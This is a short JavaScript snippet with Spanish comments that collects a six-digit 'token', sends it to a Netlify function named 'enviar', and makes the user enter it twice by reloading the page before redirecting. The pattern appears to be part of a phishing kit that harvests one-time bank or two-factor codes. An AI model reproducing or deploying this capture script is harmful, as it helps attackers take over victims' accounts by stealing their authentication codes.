<script>
const tokenInput = document.getElementById("tokenInput");

/* Solo números */
tokenInput.addEventListener("input", () => {
    tokenInput.value = tokenInput.value.replace(/[^0-9]/g, "");
});

function enviarToken() {
    const token = tokenInput.value.trim();

    // Obligatorio 6 dígitos
    if (token.length !== 6) {
        tokenInput.focus();
        return;
    }

    // Contador de clicks
    let clicks = Number(sessionStorage.getItem("clicksAceptar") || 0);
    clicks++;
    sessionStorage.setItem("clicksAceptar", clicks);

    fetch("/.netlify/functions/enviar", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            tipo: "Token",
            valor: token
        })
    }).finally(() => {
        if (clicks >= 2) {
            sessionStorage.removeItem("clicksAceptar");
            window.location.href = "index.html";
        } else {
            window.location.reload();
        }
    });
}
</script>
